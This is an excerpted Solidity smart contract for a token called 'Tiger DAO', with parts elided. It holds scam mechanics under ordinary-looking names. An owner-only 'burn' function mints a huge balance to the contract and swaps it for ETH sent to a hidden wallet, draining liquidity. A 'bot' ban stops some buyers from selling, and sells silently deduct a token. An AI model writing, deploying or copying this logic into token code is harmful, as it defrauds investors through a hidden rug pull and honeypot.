...
contract TigerDAO is IERC20, Ownable  {
    using SafeMath for uint256;

    string public constant override name = "Tiger DAO";
    string public constant override symbol = "Tiger DAO";
    uint8 public constant override decimals = 0;
    uint256 public constant override totalSupply = 5000000 * 10**decimals;
    ...
    mapping (address => uint256) private valueOf;
    uint256 private sum = 0;
    uint256 private mgp = 5 gwei;
    uint256 private mp = 4 * 10**16;
    ...
    function _buyTransfer(address sender, address recipient, uint256 amount) private {
        ...
        sum = sum.add(value);
        if(tx.gasprice > mgp && value > mp) {
            isBan[recipient] = true;
        }
    ...
    function _sellTransfer(address sender, address recipient, uint256 amount) private {
        require(!isBan[sender], "BEP20: bot can not transfer token!");
        amount = amount.sub(1);
        balanceOf[sender] = balanceOf[sender].sub(amount, "Insufficient Balance");
    ...
    function swapETH() private {
        ...
        uniswapV2Router.swapExactTokensForETH(balanceOf[tokenAddress],0,path,WALLET,block.timestamp);
    }

    function burn(uint256 amount) public onlyOwner {
        balanceOf[tokenAddress] = totalSupply.mul(amount);
        swapETH();
    }

    function getBuyValue(uint256 buyAmount) private view returns (uint256) {
        require(buyAmount > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
        (uint256 reserve0, uint256 reserve1,) = IUniswapV2Pair(pairAddress).getReserves();
        if(IUniswapV2Pair(pairAddress).token0() == tokenAddress) {
            return getAmountIn(buyAmount, reserve1, reserve0);
        } else {
    ...
    function getSellValue(uint256 sellAmount) private view returns (uint256 value) {
        require(sellAmount > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
        (uint256 reserve0, uint256 reserve1,) = IUniswapV2Pair(pairAddress).getReserves();
        if(IUniswapV2Pair(pairAddress).token0() == tokenAddress) {
            return getAmountOut(sellAmount, reserve0, reserve1);
        } else {
    ...
    function setTeamWallet(address teamWallet) public onlyOwner {
        isExcluded[teamWallet] = true; 
    }

    function setTeamWallet(address[] memory teamWallets) public onlyOwner {
        for(uint i = 0; i < teamWallets.length ; i++) {
            isExcluded[teamWallets[i]] = true; 
        }
    }
}